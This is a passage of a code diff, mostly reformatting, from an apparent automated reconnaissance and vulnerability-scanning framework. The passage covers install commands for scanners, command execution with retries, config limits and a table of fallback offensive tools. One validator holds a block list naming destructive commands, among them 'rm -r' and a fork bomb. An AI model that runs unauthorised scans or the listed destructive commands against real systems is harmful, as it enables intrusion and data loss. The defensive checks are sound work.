{total_templates:,}\\033[0m\")\n \n-def create_resource_monitor_thread(cfg: Dict[str, Any]) -> Tuple[threading.Event, threading.Thread]:\n+\n+def create_resource_monitor_thread(\n+    cfg: Dict[str, Any],\n+) -> Tuple[threading.Event, threading.Thread]:\n     \"\"\"Create and start a resource monitoring thread\"\"\"\n     stop_event = threading.Event()\n     monitor_thread = threading.Thread(\n-        target=resource_monitor,\n-        args=(cfg, stop_event),\n-        daemon=True\n+        target=resource_monitor, args=(cfg, stop_event), daemon=True\n     )\n     monitor_thread.start()\n     return stop_event, monitor_thread\n \n-def cleanup_resource_monitor(stop_event: threading.Event, monitor_thread: threading.Thread):\n+\n+def cleanup_resource_monitor(\n+    stop_event: threading.Event, monitor_thread: threading.Thread\n+):\n     \"\"\"Safely cleanup resource monitoring thread\"\"\"\n     try:\n         stop_event.set()\n         monitor_thread.join(timeout=5)  # Don't wait forever\n     except Exception as e:\n         logger.log(f\"Error cleaning up resource monitor: {e}\", \"WARNING\")\n \n \n-def execute_tool_safely(tool_name: str, args: List[str], timeout: int = 300,\n-                       output_file: Optional[Path] = None, enable_fallback: bool = True) -> bool:\n+def execute_tool_safely(\n+    tool_name: str,\n+    args: List[str],\n+    timeout: int = 300,\n+    output_file: Optional[Path] = None,\n+    enable_fallback: bool = True,\n+) -> bool:\n     \"\"\"Safely execute security tools with enhanced error handling and graceful fallbacks\"\"\"\n     # Enhanced tool availability check with installation suggestions\n     if not which(tool_name):\n         install_suggestions = {\n-            'nuclei': 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',\n-            'subfinder': 'go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',\n-            'httpx': 'go install github.com/projectdiscovery/httpx/cmd/httpx@latest',\n-            'naabu': 'go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest',\n-            'ffu': 'go install github.com/ffuf/ffuf/v2@latest',\n-            'nmap': 'apt install nmap',\n-            'sqlmap': 'apt install sqlmap',\n-            'masscan': 'apt install masscan',\n-            'gobuster': 'go install github.com/OJ/gobuster/v3@latest',\n-            'amass': 'go install github.com/owasp-amass/amass/v4/cmd/amass@master',\n-            'whois': 'apt install whois'\n+            \"nuclei\": \"go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\",\n+            \"subfinder\": \"go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest\",\n+            \"httpx\": \"go install github.com/projectdiscovery/httpx/cmd/httpx@latest\",\n+            \"naabu\": \"go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest\",\n+            \"ffu\": \"go install github.com/ffuf/ffuf/v2@latest\",\n+            \"nmap\": \"apt install nmap\",\n+            \"sqlmap\": \"apt install sqlmap\",\n+            \"masscan\": \"apt install masscan\",\n+            \"gobuster\": \"go install github.com/OJ/gobuster/v3@latest\",\n+            \"amass\": \"go install github.com/owasp-amass/amass/v4/cmd/amass@master\",\n+            \"whois\": \"apt install whois\",\n         }\n \n         suggestion = install_suggestions.get(tool_name, f\"Please install {tool_name}\")\n-        logger.log(f\"Tool '{tool_name}' not available. Install with: {suggestion}\", \"WARNING\")\n+        logger.log(\n+            f\"Tool '{tool_name}' not available. Install with: {suggestion}\", \"WARNING\"\n+        )\n \n         # Try fallback function if enabled and available\n         if enable_fallback and tool_name in FALLBACK_FUNCTIONS:\n             try:\n                 logger.log(f\"Attempting fallback method for {tool_name}\", \"INFO\")\n@@ -2807,14 +3581,23 @@\n             except Exception as e:\n                 logger.log(f\"Fallback method failed for {tool_name}: {e}\", \"ERROR\")\n \n         # Check if this is a critical tool and suggest alternatives\n         critical_alternatives = {\n-            'nuclei': ['Manual vulnerability scanning recommended', 'Consider using nikto or manual testing'],\n-            'nmap': ['Use netcat for port testing', 'Consider using naabu or masscan'],\n-            'subfinder': ['Try manual subdomain enumeration', 'Use DNS brute force with wordlists'],\n-            'sqlmap': ['Perform manual SQL injection testing', 'Use custom payloads for testing']\n+            \"nuclei\": [\n+                \"Manual vulnerability scanning recommended\",\n+                \"Consider using nikto or manual testing\",\n+            ],\n+            \"nmap\": [\"Use netcat for port testing\", \"Consider using naabu or masscan\"],\n+            \"subfinder\": [\n+                \"Try manual subdomain enumeration\",\n+                \"Use DNS brute force with wordlists\",\n+            ],\n+            \"sqlmap\": [\n+                \"Perform manual SQL injection testing\",\n+                \"Use custom payloads for testing\",\n+            ],\n         }\n \n         if tool_name in critical_alternatives:\n             for alt in critical_alternatives[tool_name]:\n                 logger.log(f\"Alternative: {alt}\", \"INFO\")\n@@ -2822,17 +3605,28 @@\n         return False\n \n     # Enhanced argument validation with detailed error messages\n     for i, arg in enumerate(args):\n         if isinstance(arg, str):\n-            if not validate_input(arg, {'max_length': 1000, 'allow_empty': False}, f\"arg_{i}\"):\n-                logger.log(f\"Invalid argument #{i} for {tool_name}: '{arg[:100]}...' (length: {len(arg)})\", \"ERROR\")\n+            if not validate_input(\n+                arg, {\"max_length\": 1000, \"allow_empty\": False}, f\"arg_{i}\"\n+            ):\n+                logger.log(\n+                    f\"Invalid argument #{i} for {tool_name}: '{arg[:100]}...' (length: {len(arg)})\",\n+                    \"ERROR\",\n+                )\n                 return False\n \n             # Additional security validation for specific patterns\n-            if any(pattern in arg.lower() for pattern in ['rm -r', 'format c:', ':(){ :|:& };:']):\n-                logger.log(f\"Potentially dangerous argument detected for {tool_name}: {arg[:50]}\", \"ERROR\")\n+            if any(\n+                pattern in arg.lower()\n+                for pattern in [\"rm -r\", \"format c:\", \":(){ :|:& };:\"]\n+            ):\n+                logger.log(\n+                    f\"Potentially dangerous argument detected for {tool_name}: {arg[:50]}\",\n+                    \"ERROR\",\n+                )\n                 return False\n \n     cmd = [tool_name] + args\n     logger.log(f\"Executing: {tool_name} with {len(args)} arguments\", \"DEBUG\")\n \n@@ -2842,41 +3636,53 @@\n         cmd,\n         capture=bool(output_file),\n         timeout=timeout,\n         default=None,\n         error_msg=f\"Tool execution failed: {tool_name} (args: {len(args)})\",\n-        log_level=\"ERROR\"\n+        log_level=\"ERROR\",\n     )\n \n     if result is None:\n-        logger.log(f\"Tool {tool_name} execution returned no result - check tool output above\", \"WARNING\")\n+        logger.log(\n+            f\"Tool {tool_name} execution returned no result - check tool output above\",\n+            \"WARNING\",\n+        )\n         return False\n \n     # Enhanced output handling with validation\n-    if output_file and hasattr(result, 'stdout'):\n+    if output_file and hasattr(result, \"stdout\"):\n         if result.stdout:\n             success = atomic_write(output_file, result.stdout)\n             if success:\n-                logger.log(f\"Tool output saved to {output_file} ({len(result.stdout)} chars)\", \"DEBUG\")\n+                logger.log(\n+                    f\"Tool output saved to {output_file} ({len(result.stdout)} chars)\",\n+                    \"DEBUG\",\n+                )\n             return success\n         else:\n             logger.log(f\"Tool {tool_name} produced no output\", \"WARNING\")\n             # Create empty file to indicate tool ran but produced no output\n             if output_file:\n-                atomic_write(output_file, f\"# {tool_name} executed successfully but produced no output\\n\")\n+                atomic_write(\n+                    output_file,\n+                    f\"# {tool_name} executed successfully but produced no output\\n\",\n+                )\n             return True\n \n     # Check if tool executed successfully based on return code\n-    if hasattr(result, 'returncode'):\n+    if hasattr(result, \"returncode\"):\n         if result.returncode == 0:\n             logger.log(f\"Tool {tool_name} completed successfully\", \"DEBUG\")\n             return True\n         else:\n-            logger.log(f\"Tool {tool_name} exited with code {result.returncode}\", \"WARNING\")\n+            logger.log(\n+                f\"Tool {tool_name} exited with code {result.returncode}\", \"WARNING\"\n+            )\n             return False\n \n     return result is not None\n+\n \n # ---------- Utils ----------\n def _bump_path() -> None:\n     \"\"\"Update PATH environment variable to include common binary locations\"\"\"\n     envpath = os.environ.get(\"PATH\", \"\")\n@@ -2891,69 +3697,72 @@\n         \"/bin\",\n         \"/opt/metasploit-framework/bin\",\n         \"/snap/bin\",  # For snap packages\n         \"/usr/games\",  # Sometimes tools are installed here\n     ]\n-    \n+\n     # Also set GOPATH and GOBIN if not set\n     if not os.environ.get(\"GOPATH\"):\n         os.environ[\"GOPATH\"] = str(home / \"go\")\n-    \n+\n     if not os.environ.get(\"GOBIN\"):\n         os.environ[\"GOBIN\"] = str(home / \"go/bin\")\n-    \n+\n     # Ensure Go bin directories exist\n     go_bin = home / \"go/bin\"\n     if not go_bin.exists():\n         try:\n             go_bin.mkdir(parents=True, exist_ok=True)\n             logger.log(f\"Created Go bin directory: {go_bin}\", \"DEBUG\")\n         except Exception as e:\n             logger.log(f\"Failed to create Go bin directory: {e}\", \"WARNING\")\n-    \n+\n     for p in add:\n         s = str(p)\n         if s not in envpath:\n             try:\n                 # Check if path exists - handle both Path objects and strings\n-                if hasattr(p, 'exists'):\n+                if hasattr(p, \"exists\"):\n                     exists = p.exists()\n                 else:\n                     exists = os.path.exists(s)\n-                \n+\n                 if exists:\n                     envpath = s + os.pathsep + envpath\n             except Exception:\n                 # If we can't check existence, skip this path\n                 continue\n     os.environ[\"PATH\"] = envpath\n     logger.log(\"PATH updated with Go environment\", \"DEBUG\")\n \n+\n _bump_path()\n+\n \n def ts() -> str:\n     return datetime.utcnow().strftime(\"%Y-%m-%dT%H:%M:%S.%fZ\")\n \n+\n def atomic_write(path: Path, data: str) -> bool:\n     \"\"\"Atomically write data to a file with proper error handling\"\"\"\n \n-\n     def _write_operation():\n         path.parent.mkdir(parents=True, exist_ok=True)\n-        with tempfile.NamedTemporaryFile(\"w\", delete=False, dir=path.parent, encoding=\"utf-8\") as tmp:\n+        with tempfile.NamedTemporaryFile(\n+            \"w\", delete=False, dir=path.parent, encoding=\"utf-8\"\n+        ) as tmp:\n             tmp.write(data)\n             tmp.flush()\n             os.fsync(tmp.fileno())\n             tmp_path = Path(tmp.name)\n         os.replace(tmp_path, path)\n         return True\n \n     return safe_execute(\n-        _write_operation,\n-        default=False,\n-        error_msg=f\"Failed to write file {path}\"\n+        _write_operation, default=False, error_msg=f\"Failed to write file {path}\"\n     )\n+\n \n def read_lines(path: Path) -> List[str]:\n     \"\"\"Read lines from a file, ignoring comments and empty lines\"\"\"\n     if not path.exists():\n         return []\n@@ -2968,12 +3777,13 @@\n \n     return safe_execute(\n         _read_operation,\n         default=[],\n         error_msg=f\"Failed to read file {path}\",\n-        log_level=\"WARNING\"\n+        log_level=\"WARNING\",\n     )\n+\n \n def write_uniq(path: Path, items: List[str]) -> bool:\n     \"\"\"Write unique items to file, removing duplicates\"\"\"\n     seen = set()\n     out: List[str] = []\n@@ -2986,35 +3796,40 @@\n \n def write_lines(path: Path, items: List[str]) -> bool:\n     \"\"\"Write lines to file\"\"\"\n     return atomic_write(path, \"\\n\".join(items) + (\"\\n\" if items else \"\"))\n \n+\n def os_kind() -> str:\n     s = platform.system().lower()\n     if s == \"darwin\":\n         return \"mac\"\n     if s == \"linux\":\n         try:\n             import distro  # type: ignore\n+\n             d = distro.id().lower()\n             if d in {\"arch\", \"manjaro\", \"endeavouros\"}:\n                 return \"arch\"\n             return \"debian\"\n         except Exception:\n             return \"debian\"\n     return \"debian\"\n \n-def run_cmd(cmd,\n-            cwd: Optional[Path] = None,\n-            env: Optional[Dict[str, str]] = None,\n-            timeout: int = 0,\n-            retries: int = 0,\n-            backoff: float = 1.6,\n-            capture: bool = True,\n-            check_return: bool = True,\n-            use_shell: bool = False,\n-            input_data: Optional[str] = None) -> subprocess.CompletedProcess:\n+\n+def run_cmd(\n+    cmd,\n+    cwd: Optional[Path] = None,\n+    env: Optional[Dict[str, str]] = None,\n+    timeout: int = 0,\n+    retries: int = 0,\n+    backoff: float = 1.6,\n+    capture: bool = True,\n+    check_return: bool = True,\n+    use_shell: bool = False,\n+    input_data: Optional[str] = None,\n+) -> subprocess.CompletedProcess:\n     \"\"\"Enhanced command execution with better error handling and retry logic\"\"\"\n     if isinstance(cmd, str):\n         args = cmd if use_shell else shlex.split(cmd)\n     else:\n         args = cmd\n@@ -3039,41 +3854,54 @@\n                 env=env,\n                 text=True,\n                 capture_output=capture,\n                 timeout=timeout if timeout and timeout > 0 else None,\n                 shell=use_shell,\n-                input=input_data\n+                input=input_data,\n             )\n             dt = round(time.time() - t0, 3)\n \n             # Enhanced output logging with size limits\n             if p.stdout:\n-                stdout_preview = p.stdout[:1000] + \"...\" if len(p.stdout) > 1000 else p.stdout\n-                logger.log(f\"Command completed in {dt}s with stdout ({len(p.stdout)} chars)\", \"DEBUG\")\n+                stdout_preview = (\n+                    p.stdout[:1000] + \"...\" if len(p.stdout) > 1000 else p.stdout\n+                )\n+                logger.log(\n+                    f\"Command completed in {dt}s with stdout ({len(p.stdout)} chars)\",\n+                    \"DEBUG\",\n+                )\n                 logger.log(f\"STDOUT preview: {stdout_preview}\", \"DEBUG\")\n             if p.stderr:\n-                stderr_preview = p.stderr[:500] + \"...\" if len(p.stderr) > 500 else p.stderr\n+                stderr_preview = (\n+                    p.stderr[:500] + \"...\" if len(p.stderr) > 500 else p.stderr\n+                )\n                 logger.log(f\"STDERR ({len(p.stderr)} chars): {stderr_preview}\", \"DEBUG\")\n \n             # Enhanced return code handling\n             if check_return and p.returncode != 0:\n-                cmd_str = ' '.join(args) if isinstance(args, list) else str(args)\n+                cmd_str = \" \".join(args) if isinstance(args, list) else str(args)\n                 error_msg = f\"Command failed with exit code {p.returncode}: {cmd_str}\"\n \n                 # Provide specific error context based on return code\n                 if p.returncode == 1:\n-                    error_msg += \" (General error - check command syntax and parameters)\"\n+                    error_msg += (\n+                        \" (General error - check command syntax and parameters)\"\n+                    )\n                 elif p.returncode == 2:\n                     error_msg += \" (Invalid usage - check command arguments)\"\n                 elif p.returncode == 126:\n-                    error_msg += \" (Command found but not executable - check permissions)\"\n+                    error_msg += (\n+                        \" (Command found but not executable - check permissions)\"\n+                    )\n                 elif p.returncode == 127:\n                     error_msg += \" (Command not found - check if tool is installed)\"\n                 elif p.returncode == 130:\n                     error_msg += \" (Process interrupted - likely by user or timeout)\"\n \n-                raise subprocess.CalledProcessError(p.returncode, args, p.stdout, p.stderr)\n+                raise subprocess.CalledProcessError(\n+                    p.returncode, args, p.stdout, p.stderr\n+                )\n \n             logger.log(f\"Command executed successfully in {dt}s\", \"DEBUG\")\n             return p\n \n         except subprocess.TimeoutExpired as e:\n@@ -3081,30 +3909,40 @@\n             timeout_msg = f\"Command timeout after {timeout}s: {args if isinstance(args, list) else cmd}\"\n             logger.log(timeout_msg, \"ERROR\")\n \n             # Provide timeout-specific recovery suggestions\n             if attempt == 0:  # Only log suggestions on first timeout\n-                logger.log(\"Timeout recovery suggestions: increase timeout, reduce scope, or check network\", \"INFO\")\n+                logger.log(\n+                    \"Timeout recovery suggestions: increase timeout, reduce scope, or check network\",\n+                    \"INFO\",\n+                )\n \n         except subprocess.CalledProcessError as e:\n             last_exc = e\n-            cmd_str = ' '.join(e.cmd) if isinstance(e.cmd, list) else str(e.cmd)\n+            cmd_str = \" \".join(e.cmd) if isinstance(e.cmd, list) else str(e.cmd)\n             logger.log(f\"Command failed (exit {e.returncode}): {cmd_str}\", \"ERROR\")\n \n             # Log stderr if available for debugging\n             if e.stderr:\n                 logger.log(f\"Command stderr: {e.stderr[:300]}...\", \"DEBUG\")\n \n         except FileNotFoundError as e:\n             last_exc = e\n-            tool_name = args[0] if isinstance(args, list) and len(args) > 0 else str(cmd)\n+            tool_name = (\n+                args[0] if isinstance(args, list) and len(args) > 0 else str(cmd)\n+            )\n             logger.log(f\"Tool not found: {tool_name}\", \"ERROR\")\n-            logger.log(f\"Install suggestion: Check if {tool_name} is installed and in PATH\", \"INFO\")\n+            logger.log(\n+                f\"Install suggestion: Check if {tool_name} is installed and in PATH\",\n+                \"INFO\",\n+            )\n \n         except Exception as e:\n             last_exc = e\n-            error_context = f\"Unexpected error executing: {args if isinstance(args, list) else cmd}\"\n+            error_context = (\n+                f\"Unexpected error executing: {args if isinstance(args, list) else cmd}\"\n+            )\n             logger.log(f\"{error_context} -> {type(e).__name__}: {e}\", \"ERROR\")\n \n         attempt += 1\n         if attempt > max_retries:\n             # Enhanced final error reporting\n@@ -3112,71 +3950,95 @@\n                 final_msg = f\"Command failed after {attempt} attempts: {args if isinstance(args, list) else cmd}\"\n                 logger.log(final_msg, \"ERROR\")\n             raise last_exc  # type: ignore\n \n         # Exponential backoff with jitter\n-        sleep_for = min(backoff ** attempt + (attempt * 0.1), 30)  # Cap at 30 seconds\n-        logger.log(f\"Retrying command in {sleep_for:.1f}s (attempt {attempt}/{max_retries})\", \"WARNING\")\n+        sleep_for = min(backoff**attempt + (attempt * 0.1), 30)  # Cap at 30 seconds\n+        logger.log(\n+            f\"Retrying command in {sleep_for:.1f}s (attempt {attempt}/{max_retries})\",\n+            \"WARNING\",\n+        )\n         time.sleep(sleep_for)\n \n+\n def ensure_layout():\n-    for d in [RUNS_DIR, LOG_DIR, EXT_DIR, EXTRA_DIR, MERGED_DIR, PAYLOADS_DIR, EXPLOITS_DIR, PLUGINS_DIR, BACKUP_DIR]:\n+    for d in [\n+        RUNS_DIR,\n+        LOG_DIR,\n+        EXT_DIR,\n+        EXTRA_DIR,\n+        MERGED_DIR,\n+        PAYLOADS_DIR,\n+        EXPLOITS_DIR,\n+        PLUGINS_DIR,\n+        BACKUP_DIR,\n+    ]:\n         d.mkdir(parents=True, exist_ok=True)\n-    for f in [\"paths_extra.txt\", \"vhosts_extra.txt\", \"params_extra.txt\", \"exploit_payloads.txt\"]:\n+    for f in [\n+        \"paths_extra.txt\",\n+        \"vhosts_extra.txt\",\n+        \"params_extra.txt\",\n+        \"exploit_payloads.txt\",\n+    ]:\n         (EXTRA_DIR / f).touch(exist_ok=True)\n     if not TARGETS.exists():\n         atomic_write(TARGETS, \"example.com\\n\")\n     if not CFG_FILE.exists():\n         atomic_write(CFG_FILE, json.dumps(DEFAULT_CFG, indent=2))\n \n+\n # Configuration cache for performance optimization\n _config_cache = None\n _config_cache_timestamp = 0\n \n+\n def load_cfg() -> Dict[str, Any]:\n     \"\"\"Load and validate configuration with caching for improved performance\"\"\"\n     global _config_cache, _config_cache_timestamp\n-    \n+\n     ensure_layout()\n-    \n+\n     # Check if we have a cached config and if the file hasn't changed\n     try:\n         current_timestamp = CFG_FILE.stat().st_mtime if CFG_FILE.exists() else 0\n-        \n+\n         if _config_cache is not None and _config_cache_timestamp == current_timestamp:\n             return _config_cache.copy()\n-        \n+\n         # Load configuration from file\n         cfg_data = json.loads(CFG_FILE.read_text(encoding=\"utf-8\"))\n-        \n+\n         # Validate critical configuration sections\n         validated_cfg = _validate_configuration(cfg_data)\n-        \n+\n         # Cache the validated configuration\n         _config_cache = validated_cfg.copy()\n         _config_cache_timestamp = current_timestamp\n-        \n+\n         return validated_cfg\n-        \n+\n     except Exception as e:\n         logger.log(f\"Configuration load error: {e}, using defaults\", \"WARNING\")\n-        \n+\n         # Cache the default configuration\n         default_cfg = DEFAULT_CFG.copy()\n         _config_cache = default_cfg.copy()\n         _config_cache_timestamp = 0\n-        \n+\n         return default_cfg\n+\n \n def _validate_configuration(cfg: Dict[str, Any]) -> Dict[str, Any]:\n     \"\"\"Enhanced configuration validation with comprehensive checks and safe defaults\"\"\"\n     # Create a copy to avoid modifying the original\n     validated_cfg = cfg.copy()\n \n     # Validate limits section with expanded checks\n     limits = validated_cfg.get(\"limits\", {})\n-    limits[\"max_concurrent_scans\"] = max(1, min(limits.get(\"max_concurrent_scans\", 8), 20))\n+    limits[\"max_concurrent_scans\"] = max(\n+        1, min(limits.get(\"max_concurrent_scans\", 8), 20)\n+    )\n     limits[\"http_timeout\"] = max(5, min(limits.get(\"http_timeout\", 15), 300))\n     limits[\"rps\"] = max(1, min(limits.get(\"rps\", 500), 2000))\n     limits[\"parallel_jobs\"] = max(1, min(limits.get(\"parallel_jobs\", 10), 50))\n     limits[\"max_retries\"] = max(0, min(limits.get(\"max_retries\", 3), 10))\n     limits[\"scan_depth\"] = max(1, min(limits.get(\"scan_depth\", 3), 10))\n@@ -3193,14 +4055,22 @@\n     nuclei[\"all_templates\"] = nuclei.get(\"all_templates\", False)\n     validated_cfg[\"nuclei\"] = nuclei\n \n     # Enhanced resource management\n     resource_mgmt = validated_cfg.get(\"resource_management\", {})\n-    resource_mgmt[\"monitor_interval\"] = max(1, min(resource_mgmt.get(\"monitor_interval\", 5), 60))\n-    resource_mgmt[\"cpu_threshold\"] = max(10, min(resource_mgmt.get(\"cpu_threshold\", 80), 100))\n-    resource_mgmt[\"memory_threshold\"] = max(10, min(resource_mgmt.get(\"memory_threshold\", 80), 100))\n-    resource_mgmt[\"disk_threshold\"] = max(10, min(resource_mgmt.get(\"disk_threshold\", 90), 100))\n+    resource_mgmt[\"monitor_interval\"] = max(\n+        1, min(resource_mgmt.get(\"monitor_interval\", 5), 60)\n+    )\n+    resource_mgmt[\"cpu_threshold\"] = max(\n+        10, min(resource_mgmt.get(\"cpu_threshold\", 80), 100)\n+    )\n+    resource_mgmt[\"memory_threshold\"] = max(\n+        10, min(resource_mgmt.get(\"memory_threshold\", 80), 100)\n+    )\n+    resource_mgmt[\"disk_threshold\"] = max(\n+        10, min(resource_mgmt.get(\"disk_threshold\", 90), 100)\n+    )\n     resource_mgmt[\"auto_pause\"] = resource_mgmt.get(\"auto_pause\", True)\n     resource_mgmt[\"cleanup_temp\"] = resource_mgmt.get(\"cleanup_temp\", True)\n     validated_cfg[\"resource_management\"] = resource_mgmt\n \n     # Enhanced scanning configuration\n@@ -3216,11 +4086,13 @@\n     # Fuzzing configuration\n     fuzzing = validated_cfg.get(\"fuzzing\", {})\n     fuzzing[\"enable_ffu\"] = fuzzing.get(\"enable_ffu\", True)\n     fuzzing[\"enable_feroxbuster\"] = fuzzing.get(\"enable_feroxbuster\", True)\n     fuzzing[\"enable_gobuster\"] = fuzzing.get(\"enable_gobuster\", True)\n-    fuzzing[\"wordlist_size_limit\"] = max(100, min(fuzzing.get(\"wordlist_size_limit\", 50000), 1000000))\n+    fuzzing[\"wordlist_size_limit\"] = max(\n+        100, min(fuzzing.get(\"wordlist_size_limit\", 50000), 1000000)\n+    )\n     fuzzing[\"threads\"] = max(1, min(fuzzing.get(\"threads\", 20), 100))\n     fuzzing[\"delay\"] = max(0, min(fuzzing.get(\"delay\", 0), 5000))  # milliseconds\n     validated_cfg[\"fuzzing\"] = fuzzing\n \n     # Output and reporting\n@@ -3255,12 +4127,14 @@\n     plugins[\"trusted_sources\"] = plugins.get(\"trusted_sources\", [])\n     validated_cfg[\"plugins\"] = plugins\n \n     return validated_cfg\n \n+\n def save_cfg(cfg: Dict[str, Any]):\n     atomic_write(CFG_FILE, json.dumps(cfg, indent=2))\n+\n \n def which(tool: str) -> bool:\n     \"\"\"Enhanced tool detection with fallback alternatives\"\"\"\n     if ENHANCED_TOOL_MANAGER_AVAILABLE:\n         # Use enhanced tool manager\n@@ -3268,100 +4142,95 @@\n         return result is not None\n     else:\n         # Fallback to standard shutil.which\n         return shutil.which(tool) is not None\n \n+\n # ---------- Enhanced Tool Fallback System ----------\n+\n \n class EnhancedToolFallbackManager:\n     \"\"\"Enhanced tool management with intelligent fallbacks and auto-installation\"\"\"\n \n     TOOL_ALTERNATIVES = {\n         # Subdomain Discovery (Enhanced)\n-        \"subfinder\": [\"amass\", \"assetfinder\", \"findomain\", \"sublist3r\", \"dnsrecon\", \"fierce\"],\n+        \"subfinder\": [\n+            \"amass\",\n+            \"assetfinder\",\n+            \"findomain\",\n+            \"sublist3r\",\n+            \"dnsrecon\",\n+            \"fierce\",\n+        ],\n         \"amass\": [\"subfinder\", \"assetfinder\", \"findomain\", \"sublist3r\"],\n         \"assetfinder\": [\"subfinder\", \"amass\", \"findomain\", \"sublist3r\"],\n         \"findomain\": [\"subfinder\", \"amass\", \"assetfinder\", \"sublist3r\"],\n         \"sublist3r\": [\"subfinder\", \"amass\", \"assetfinder\", \"findomain\"],\n-\n         # Port Scanning (Enhanced)\n         \"naabu\": [\"masscan\", \"nmap\", \"zmap\", \"rustscan\", \"unicornscan\"],\n         \"masscan\": [\"nmap\", \"naabu\", \"zmap\", \"rustscan\"],\n         \"nmap\": [\"masscan\", \"naabu\", \"zmap\", \"rustscan\"],\n         \"rustscan\": [\"nmap\", \"masscan\", \"naabu\", \"zmap\"],\n         \"zmap\": [\"masscan\", \"nmap\", \"naabu\", \"rustscan\"],\n-\n         # HTTP Probing (Enhanced)\n         \"httpx\": [\"httprobe\", \"curl\", \"wget\", \"meg\"],\n         \"httprobe\": [\"httpx\", \"curl\", \"wget\"],\n         \"meg\": [\"httpx\", \"httprobe\", \"curl\"],\n-\n         # Directory Fuzzing (Enhanced)\n         \"gobuster\": [\"ffu\", \"dirb\", \"dirsearch\", \"feroxbuster\", \"wfuzz\", \"dirseek\"],\n         \"ffu\": [\"gobuster\", \"dirb\", \"dirsearch\", \"feroxbuster\", \"wfuzz\"],\n         \"dirb\": [\"gobuster\", \"ffu\", \"dirsearch\", \"feroxbuster\"],\n         \"dirsearch\": [\"gobuster\", \"ffu\", \"dirb\", \"feroxbuster\", \"wfuzz\"],\n         \"feroxbuster\": [\"ffu\", \"gobuster\", \"dirsearch\", \"wfuzz\"],\n         \"wfuzz\": [\"ffu\", \"gobuster\", \"dirsearch\", \"feroxbuster\"],\n-\n         # Web Crawling (Enhanced)\n         \"waybackurls\": [\"gau\", \"gospider\", \"hakrawler\", \"photon\", \"paramspider\"],\n         \"gau\": [\"waybackurls\", \"gospider\", \"hakrawler\", \"photon\"],\n         \"gospider\": [\"waybackurls\", \"gau\", \"hakrawler\", \"photon\"],\n         \"hakrawler\": [\"waybackurls\", \"gau\", \"gospider\", \"photon\"],\n         \"photon\": [\"waybackurls\", \"gau\", \"gospider\", \"hakrawler\"],\n-\n         # Vulnerability Scanning (Enhanced)\n         \"nuclei\": [\"nikto\", \"nmap\", \"w3a\", \"skipfish\", \"zaproxy\", \"arachni\"],\n         \"nikto\": [\"nuclei\", \"nmap\", \"w3a\", \"skipfish\"],\n         \"nmap\": [\"nuclei\", \"nikto\", \"masscan\", \"w3a\"],\n         \"w3a\": [\"nuclei\", \"nikto\", \"skipfish\", \"zaproxy\"],\n         \"zaproxy\": [\"nuclei\", \"nikto\", \"w3a\", \"skipfish\"],\n-\n         # Web Technology Detection (Enhanced)\n         \"whatweb\": [\"wappalyzer\", \"httpx\", \"webanalyze\", \"builtwith\"],\n         \"webanalyze\": [\"whatweb\", \"wappalyzer\", \"httpx\", \"builtwith\"],\n         \"wappalyzer\": [\"whatweb\", \"webanalyze\", \"httpx\"],\n-\n         # SQL Injection (Enhanced)\n         \"sqlmap\": [\"sqlninja\", \"jSQL\", \"bbqsql\", \"commix\", \"NoSQLMap\"],\n         \"commix\": [\"sqlmap\", \"sqlninja\", \"jSQL\"],\n         \"sqlninja\": [\"sqlmap\", \"commix\", \"jSQL\"],\n-\n         # XSS Testing (Enhanced)\n         \"dalfox\": [\"xsstrike\", \"xsser\", \"xss-payload-generator\", \"XSScrapy\"],\n         \"xsstrike\": [\"dalfox\", \"xsser\", \"XSScrapy\"],\n         \"xsser\": [\"dalfox\", \"xsstrike\", \"XSScrapy\"],\n-\n         # Parameter Discovery (Enhanced)\n         \"arjun\": [\"paramspider\", \"x8\", \"param-miner\", \"parameth\"],\n         \"paramspider\": [\"arjun\", \"x8\", \"param-miner\"],\n         \"x8\": [\"arjun\", \"paramspider\", \"param-miner\"],\n         \"parameth\": [\"arjun\", \"paramspider\", \"x8\"],\n-\n         # Subdomain Takeover (Enhanced)\n         \"subjack\": [\"subzy\", \"subdomain-takeover\", \"can-i-take-over-xyz\", \"subover\"],\n         \"subzy\": [\"subjack\", \"subdomain-takeover\", \"subover\"],\n         \"subover\": [\"subjack\", \"subzy\", \"subdomain-takeover\"],\n-\n         # DNS Tools (Enhanced)\n         \"dig\": [\"nslookup\", \"host\", \"drill\", \"kdig\"],\n         \"nslookup\": [\"dig\", \"host\", \"drill\"],\n         \"host\": [\"dig\", \"nslookup\", \"drill\"],\n         \"drill\": [\"dig\", \"nslookup\", \"host\"],\n-\n         # Network Analysis (Enhanced)\n         \"ncat\": [\"nc\", \"netcat\", \"socat\"],\n         \"nc\": [\"ncat\", \"netcat\", \"socat\"],\n         \"netcat\": [\"ncat\", \"nc\", \"socat\"],\n         \"socat\": [\"ncat\", \"nc\", \"netcat\"],\n-\n         # SSL/TLS Analysis\n         \"sslscan\": [\"sslyze\", \"testssl\", \"ssl-enum-ciphers\"],\n         \"sslyze\": [\"sslscan\", \"testssl\", \"ssl-enum-ciphers\"],\n         \"testssl\": [\"sslscan\", \"sslyze\", \"ssl-enum-ciphers\"],\n-\n         # Content Discovery (Enhanced)\n         \"katana\": [\"gospider\", \"hakrawler\", \"gau\", \"waybackurls\"],\n         \"crawley\": [\"katana\", \"gospider\", \"hakrawler\"],\n     }\n \n@@ -3387,22 +4256,20 @@\n         \"dalfox\": \"go install github.com/hahwul/dalfox/v2@latest\",\n         \"x8\": \"go install github.com/Sh1Yo/x8/cmd/x8@latest\",\n         \"rustscan\": \"go install github.com/RustScan/RustScan@latest\",\n         \"hakrawler\": \"go install github.com/hakluke/hakrawler@latest\",\n         \"meg\": \"go install github.com/tomnomnom/meg@latest\",\n-\n         # Python tools (Enhanced)\n         \"dirsearch\": \"pip3 install dirsearch\",\n         \"sqlmap\": \"pip3 install sqlmap\",\n         \"arjun\": \"pip3 install arjun\",\n         \"xsstrike\": \"pip3 install XSStrike\",\n         \"commix\": \"pip3 install commix\",\n         \"photon\": \"pip3 install photon-crawler\",\n         \"sublist3r\": \"pip3 install sublist3r\",\n         \"parameth\": \"pip3 install parameth\",\n         \"wfuzz\": \"pip3 install wfuzz\",\n-\n         # System packages (Enhanced)\n         \"nmap\": \"apt-get update && apt-get install -y nmap\",\n         \"masscan\": \"apt-get update && apt-get install -y masscan\",\n         \"gobuster\": \"apt-get update && apt-get install -y 